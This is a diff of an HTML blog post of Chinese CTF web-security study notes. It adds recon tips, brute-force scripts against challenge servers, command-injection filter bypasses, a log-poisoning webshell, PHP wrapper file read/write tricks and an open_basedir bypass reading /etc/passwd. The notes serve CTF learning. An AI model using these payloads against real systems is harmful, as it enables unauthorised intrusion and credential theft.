@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="Na0H_1e3">
   <meta name="keywords" content="Na0H1e3,blog,博客,web,ctf,渗透">
-  <title>Buuctf|Bugku之web知识小记（长期更|大概） - Na0H的神光棒存放地</title>
+  <title>web知识小记（长期更|大概） - Na0H的神光棒存放地</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -174,7 +174,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Buuctf|Bugku之web知识小记（长期更|大概）">
+            <span class="h2" id="subtitle" title="web知识小记（长期更|大概）">
               
             </span>
 
@@ -184,8 +184,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-03-09 21:51" pubdate>
-        2021年3月9日 晚上
+      <time datetime="2021-04-06 21:51" pubdate>
+        2021年4月6日 晚上
       </time>
     </span>
   
@@ -196,7 +196,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      3.5k 字
+      6.2k 字
     </span>
   
 
@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      49
+      84
        分钟
     </span>
   
@@ -244,18 +244,148 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Buuctf|Bugku之web知识小记（长期更|大概）</h1>
+            <h1 style="display: none">web知识小记（长期更|大概）</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年3月28日 下午
+                  本文最后更新于：2021年4月6日 晚上
                 
               </p>
             
             <div class="markdown-body">
               <!-- more -->
 
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇长期更新，大概就是总结一下一直以来刷的web题中的一些小知识，但像sql注入、文件上传、伪协议之类系统学习过的就不在这里赘述了</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇长期更新，大概就是总结一下一直以来刷的web题中的一些小知识</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul>
+<li>查看源代码：右键点击，有时会出现右键被禁用的情况：view-source:url</li>
+<li>F12看请求包、响应包、Cookie</li>
+<li>（url/editor）某编辑器editor最新版默认配置下，如果目录不存在，则会遍历服务器根目录</li>
+<li>探针：eg雅黑 url/tz.php</li>
+<li>开发人员在各种文档中的一些信息泄漏（账户密码？）、管理员邮件、帐号</li>
+<li>真实ip、子域名、旁站</li>
+<li>源码泄漏：<br>常见网站源码备份名：web、www、website、backup、back、wwwroot、temp<br>常见网站源码备份后缀：tar、tar.gz、zip、rar<br>.git、.svn、.hg、.DS_Store、CVS</li>
+<li>phps：xxx.php -&gt; xxx.phps</li>
+<li>mdb文件：早期asp+access构架的数据库文件，该文件泄漏相当于数据库被tuoku</li>
+<li>WEB-INF/web.xml<br>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件</li>
+</ul>
+<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><ul>
+<li><p>子域名爆破、目录爆破</p>
+</li>
+<li><p>token</p>
+</li>
+<li><p>利用得到的信息进行爆破<br>比方说ctfshowweb27：<br><img src="https://i.loli.net/2021/04/06/zd6Qf3qLvyog7Y4.png" srcset="/img/loading.gif">可以利用姓名和身份证查询学号(录取时的查询系统)，而身份证被部分打码，这时就可以写脚本爆破（身份证是有规律的，爆破结合社工更有效率）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;url/info/checkdb.php&quot;</span><br>usr = [<span class="hljs-string">&#x27;高先伊&#x27;</span>, <span class="hljs-string">&#x27;嵇开梦&#x27;</span>, <span class="hljs-string">&#x27;郎康焕&#x27;</span>, <span class="hljs-string">&#x27;元羿谆&#x27;</span>, <span class="hljs-string">&#x27;祁落兴&#x27;</span>]<br>card1 = [<span class="hljs-string">&#x27;621022&#x27;</span>, <span class="hljs-string">&#x27;360730&#x27;</span>, <span class="hljs-string">&#x27;522601&#x27;</span>, <span class="hljs-string">&#x27;45102&#x27;</span>, <span class="hljs-string">&#x27;410927&#x27;</span>]<br>card2 = [<span class="hljs-string">&#x27;5237&#x27;</span>, <span class="hljs-string">&#x27;7653&#x27;</span>, <span class="hljs-string">&#x27;8092&#x27;</span>, <span class="hljs-string">&#x27;3419&#x27;</span>, <span class="hljs-string">&#x27;5570&#x27;</span>]<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    a, b, c = usr[j], card1[j], card2[j]<br>    <span class="hljs-keyword">for</span> year <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1990</span>, <span class="hljs-number">1993</span>):<br>        <span class="hljs-keyword">for</span> mon <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">13</span>):<br>            <span class="hljs-keyword">for</span> day <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>):<br>                <span class="hljs-keyword">if</span> mon == <span class="hljs-number">2</span>:<br>                    <span class="hljs-keyword">if</span> year % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> year % <span class="hljs-number">100</span> != <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> year % <span class="hljs-number">400</span> <span class="hljs-keyword">and</span> day &gt; <span class="hljs-number">29</span>:<br>                        <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">elif</span> day &gt; <span class="hljs-number">28</span>:<br>                        <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">elif</span> mon <span class="hljs-keyword">in</span> [<span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>] <span class="hljs-keyword">and</span> day &gt; <span class="hljs-number">30</span>:<br>                    <span class="hljs-keyword">break</span><br>                card = b + <span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;%d&quot;</span> % year) + <span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;%02d&quot;</span> % mon) + <span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;%02d&quot;</span> % day) + c<br>                payload = <span class="hljs-built_in">dict</span>(a=a, p=card)<br>					  r = requests.post(url, data=payload)<br>                print(payload, r.text)<br></code></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<ul>
+<li><p>tomcat认证爆破：<br>1、burps抓包，利用字典爆破。（ctfshowweb21）<br>ps：利用custom iterator(自定义迭代器)：Payload set —-&gt;custom iterator<br>需要进行base64编码；payload processing 进行编码设置<br>取消Palyload Encoding编码 因为在进行base64加密的时候在最后可能存在 == 这样就会影响base64 加密的结果<br>2、python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&#x27;http://65efec28-322f-476e-aef1-b6cb3151a201.challenge.ctf.show:8080/&#x27;</span><br>password = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\ls\\Desktop\\最新网站后台密码破解字典.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        data = f.readline()<br>        <span class="hljs-keyword">if</span> data:<br>            password.append(data)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> password:<br>    strs = <span class="hljs-string">&#x27;admin:&#x27;</span> + p[:-<span class="hljs-number">1</span>]<br>    header = &#123;<br>        <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(base64.b64encode(strs.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    &#125;<br>    rep = requests.get(url, headers=header)<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    <span class="hljs-keyword">if</span> rep.status_code == <span class="hljs-number">200</span>:<br>        print(rep.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure></li>
+<li><p>mt_rand()、mt_srand(seed)：</p>
+<ul>
+<li><p>mt_srand(seed)：分发seed种子，有了种子后生成随机数<br>ps：php&gt;4.2，随机数生成器自动播种，没必要使用该函数手动播种，<strong>若设置了seed参数，则生成的随机数为伪随机数，即每次访问得到的随机数其实都是一样的</strong>（ctfshowweb24）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 重复刷新页面，得到的随机数不变；但每次调用mt_rand()得的随机数不等</span><br><span class="hljs-comment"># 而mt_rand()+mt_rand()也并不简单的等于对应次数的随机数相加（比这更复杂）</span><br><span class="hljs-meta">&lt;?php</span><br>    mt_srand(<span class="hljs-number">37976766</span>);<br>    <span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;			<span class="hljs-comment"># 1669514551</span><br>    <span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;			<span class="hljs-comment"># 1927304004</span><br>    <span class="hljs-keyword">echo</span> mt_rand()+mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;	<span class="hljs-comment"># 2786133454</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
+<li><p>所谓的每次访问不是指一个脚本中重复使用mt_rand()，在同一脚本中，每次调用mt_rand()都会得到不一样的随机数，但调用顺序和其值还是一一对应且固定的。（ctfshowweb25）<br>并且mt_rand()+mt_rand()也并不简单的等于对应次数的随机数相加（比这更复杂，那就难以知晓其值了）<br>解决办法是<a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/%EF%BC%88linux%E4%B8%8B%E5%AE%89%E8%A3%85%EF%BC%89">https://www.openwall.com/php_mt_seed/（linux下安装）</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">（kali下解压然后进入目录make就行）<br>tar -zxvf xxx.tar.gz<br>make<br></code></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><ul>
+<li><p>先是常见的命令执行两兄弟：</p>
+<ul>
+<li>**eval()**：把字符串按照 PHP 代码来计算。 字符串必须是合法的 PHP 代码，且须以分号结尾<br>可见其对命令实现实际是将括号包含的语句插入到自身的位置，那就可以添加各种语句进行截断：?&gt;&lt;?、exit(0)；</li>
+<li><strong>system()**：执行 指定的命令， 并输出执行结果<br>成功则返回命令输出的最后一行， 失败则返回 **<code>false</code></strong></li>
+</ul>
+</li>
+<li><p>一些符号</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">通配符、占位符：*、？<br>当一些文件名被禁用，他们就派上用场了<br>命令分割符（如;被禁用就可以用上）<br><span class="hljs-meta">%</span><span class="bash">0a、%0d    <span class="hljs-comment"># 换行符、回车符</span></span><br>|           # 第一条命令结果作为第二条命令的输入<br>||          # 第一条执行失败，执行第二条命令<br>;           # 连续指令功能。<br>&amp;           # 连接的两条命令都会执行<br>&amp;&amp;          # 当第一条执行成功后执行后续命令<br></code></pre></td></tr></table></figure></li>
+<li><p>显示文件内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev<br>file_get_content()、show_source()、include()、highlight_file()<br><br>假如:和括号被禁，就需要使用一些无需括号的语言结构，如：echo、print、isset、unset、include、require<br></code></pre></td></tr></table></figure></li>
+<li><p>一些bypass</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">空格：<br><span class="hljs-meta">	%</span><span class="bash">09</span><br><span class="hljs-meta">	$</span><span class="bash">IFS<span class="hljs-variable">$9</span>（url编码下<span class="hljs-variable">$9</span>为linuxshell进程的第九个参数，始终为空字符）、<span class="hljs-variable">$&#123;IFS&#125;</span></span><br>	&lt;&gt;、&lt;<br>	利用输出作为输入：?a=flag.php -&gt; ?a=&#123;ls,-l&#125;<br>黑名单：<br>	通配符、占位符：*、？<br>	夹杂字符：&#x27;&#x27;、&quot;&quot;、``、$&#123;x&#125;、$1、\、<br><span class="hljs-meta">	$</span><span class="bash">&#123;&#125;:</span><br>	会识别包含的第一个字符，只要将第一个字符修改为如空格，tab，注释，回车就会避免被直接当成变量，而将其执行为PHP代码<br>	ps:在被“”包裹时候直接$&#123;&#125;是不可以的，因为PHP将会将它识别为可变变量而不是一个PHP代码<br>利用系统变量切片构造命令：<br>	如/ = $&#123;PATH:0:1&#125; = /bin/xxx[0]<br></code></pre></td></tr></table></figure></li>
+<li><p>无参数命令<br>eg:GXYCTF紧致套娃<br>执行利用变量获取flag.php，再将其显示出来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">scandir(目录,[<span class="hljs-number">0</span>|<span class="hljs-number">1</span>:升|降序],[context])——列出指定路径中的文件和目录localeconv()——返回一包含本地数字及货币格式信息的数组,数组第一项是.<br>current()——返回数组中的当前元素值, 默认取第一个值，别名为pos()<br>array_reverse()——逆向输出数组<br>array_flip()交换数组的键和值<br>array_rand()从数组随机一个或多个单元，不断刷新访问就会不断随机返回<br>最终payload：<br>show_source(next(array_reverse(scandir(pos(localeconv())))));<br>highlight_file(next(array_reverse(scandir(current(localeconv())))));<br>highlight_file(array_rand(array_flip(scandir(current(localeconv())))));<br>highlight_file(next(array_reverse(scandir(current(localeconv())))));<br></code></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<ul>
+<li><p>利用系统变量切片构造命令（黑名单绕过）</p>
+</li>
+<li><p>一些命令执行读取文件的思路</p>
+<blockquote>
+<p><strong>嵌套eval</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=phpinfo();) (这里的<span class="hljs-number">1</span>逃逸出黑名单，可以任意传入)<br></code></pre></td></tr></table></figure>
+
+<p><strong>包含日志拿shell</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">user_agent：<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_post</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br>然后<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br>nginx的日志文件为/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure>
+
+<p><strong>利用ssrf</strong>：<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7fab00c11770">php curl实现发送get和post请求</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ch</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-string">&quot;file:///var/www/flag.php&quot;</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br>print_r(<span class="hljs-variable">$output</span>);<br></code></pre></td></tr></table></figure>
+
+<p><strong>伪协议对文件进行读写</strong>：</p>
+<ul>
+<li><p><strong>data://</strong></p>
+<ul>
+<li><code>allow_url_fopen</code> ：on<br><code>allow_url_include</code>：on<br><code>PHP版本 &gt;= 5.2</code></li>
+<li>运用：<code>data:资源类型;编码,内容</code><br><code>?xxx=data://text/plain;base64,(base64编码的内容)</code>或：<code>?xxx=data:text/plain,(url编码的内容)</code></li>
+</ul>
+</li>
+<li><p><strong>php://filter</strong></p>
+<p>参数如下：</p>
+<table>
+<thead>
+<tr>
+<th><strong>php://filter 参数</strong></th>
+<th align="center"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>名称</td>
+<td align="center">描述</td>
+</tr>
+<tr>
+<td><code>resource=&lt;要过滤的数据流&gt;</code></td>
+<td align="center">必须。它指定了你要筛选过滤的数据流</td>
+</tr>
+<tr>
+<td><code>read=&lt;读链的筛选列表&gt;</code></td>
+<td align="center">可选。可以设定一个或多个过滤器名称，以管道符（`</td>
+</tr>
+<tr>
+<td><code>write=&lt;写链的筛选列表&gt;</code></td>
+<td align="center">可选。可以设定一个或多个过滤器名称，以管道符（`</td>
+</tr>
+<tr>
+<td><code>&lt;；两个链的筛选列表&gt;</code></td>
+<td align="center">任何没有以<code>read=</code>或<code>write=</code>作前缀的筛选器列表会视情况应用于读或写链</td>
+</tr>
+</tbody></table>
+<p>常用：<br>base64：<br>读文件<code>php://filter/read=convert.base64-encode/resource=hhh.php</code><br>写文件就把read改成write就行<br>还有就是在进行base64编码难免生成+=,特别是?&gt;转码后以<code>==</code>结尾，那么可以在不影响代码的情况下修改其末尾：<br><code>&lt;?php system(&#39;tac *.php&#39;);?&gt;aa</code>即可消灭<code>==</code><br>rot13<br>将文件写入：<code>php://filter/write=string.rot13/resource=shell.php</code><br>（若事先将文件内容rot13编码，rot13二次编码后即得到原文）</p>
+</li>
+<li><p><strong>glob://</strong><br>设计缺陷导致的任意<strong>文件名</strong>列出（通常只能列出根目录以及open_basedir下的文件名）</p>
+<ul>
+<li>scandir()+glob://</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#以下三种payload，都可以将扫描结果输出，绝对路径|相对路径都可以</span><br>  var_dump(scandir(<span class="hljs-string">&quot;glob:///*&quot;</span>));<br>  print_r(scandir(<span class="hljs-string">&quot;glob://./*&quot;</span>));<br>  <span class="hljs-keyword">echo</span> json_encode(scandir(<span class="hljs-string">&quot;glob://../*&quot;</span>));<br>  <span class="hljs-comment">#  以下是学长的碎碎念</span><br>  <span class="hljs-comment"># （关键在于 scandir() + glob伪协议</span><br>  <span class="hljs-comment"># （不过实际上也可以用别的方法来弄，这个涉及到CTF。。一般来说不会这么绝</span><br>  <span class="hljs-comment"># （比如 opendir 吧</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>DirectoryIterator+glob://<br>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">  <span class="hljs-meta">&lt;?php</span> <br>      <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">directoryiterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>); <br>  <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;__tostring().<span class="hljs-string">&#x27; &#x27;</span>); <br>  &#125; <br><span class="hljs-meta">?&gt;</span><br>  <span class="hljs-comment">#	glob:///*	会列出根目录下的文件</span><br></code></pre></td></tr></table></figure>
+<h1 id="glob-会列出open-basedir允许目录下的文件"><a href="#glob-会列出open-basedir允许目录下的文件" class="headerlink" title="glob://*    会列出open_basedir允许目录下的文件"></a>glob://*    会列出open_basedir允许目录下的文件</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- opendir()+readdir()+glob:<span class="hljs-comment">//</span><br><br>```php<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = opendir(<span class="hljs-string">&#x27;glob:///*&#x27;</span>) ) &#123;<br>      <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = readdir(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>      &#125;<br>      closedir(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure>
+<p>}<br> ?&gt;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">  <br>  <br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
 <h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><h2 id="强-弱比较"><a href="#强-弱比较" class="headerlink" title="强|弱比较"></a>强|弱比较</h2><p>强比较<code>===</code>：先比较类型是否相同；再比较值</p>
 <p>弱类型比较<code>==</code>：会将字符类型转换为相同类型，在比较值<br>（ps：若比较数字和字符串 | 涉及数字内容的字符串；则字符串会转换为数值并按数值进行比较）</p>
 <blockquote>
@@ -375,6 +505,23 @@
 <li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></li>
 <li><code>.</code>不会匹配换行符；<br>eg:<code>preg_match(&#39;/^.*(flag).*$/&#39;, $a)</code>可令<code>a=&quot;\nflag&quot;</code><br>而非多行模式下，<code>$</code>会忽略末尾的<code>%0a</code>即空字符；<br>eg:<code>preg_match(&#39;/^flag$/&#39;, $_GET[&#39;a&#39;]) &amp;&amp; $_GET[&#39;a&#39;] !== &#39;flag&#39;</code>可输入<code>a=flag%0a</code></li>
 </ol>
+<h3 id="open-basedir-绕过"><a href="#open-basedir-绕过" class="headerlink" title="open_basedir()绕过"></a>open_basedir()绕过</h3><h4 id="chdir-、ini-set-函数组合"><a href="#chdir-、ini-set-函数组合" class="headerlink" title="chdir()、ini_set()函数组合"></a>chdir()、ini_set()函数组合</h4><p>利用ini_set()设置php.ini的值，在函数执行时生效，脚本结束后恢复原状。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ini_set ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$varname</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$newvalue</span> ) : <span class="hljs-keyword">string</span><br></code></pre></td></tr></table></figure>
+<p>varname是需要设置的值；newvalue是设置成为新的值<br>成功时返回旧的值，失败时返回 FALSE</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">payload：<br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);system(‘cat ../../../../../etc/passwd’);<br></code></pre></td></tr></table></figure>
+
+
+<h4 id="glob"><a href="#glob" class="headerlink" title="glob://"></a>glob://</h4><p>glob://协议是php5.3.0以后一种查找匹配的文件路径模式，而单纯传参glob://是没办法列目录的，需要结合其他函数方法</p>
+<h5 id="scandir-glob"><a href="#scandir-glob" class="headerlink" title="scandir()+glob://"></a>scandir()+glob://</h5><p>只能列出根目录以及open_basedir()允许目录下的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>var_dump(scandir(<span class="hljs-string">&#x27;glob:///*&#x27;</span>));<br>&gt;<br></code></pre></td></tr></table></figure>
+
+
+<h5 id="DirectoryIterator-glob"><a href="#DirectoryIterator-glob" class="headerlink" title="DirectoryIterator+glob://"></a>DirectoryIterator+glob://</h5><p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">payloadL:<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*.txt&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#	glob:///*	会列出根目录下的文件</span><br><span class="hljs-comment"># 	glob://*	会列出open_basedir允许目录下的文件</span><br></code></pre></td></tr></table></figure>
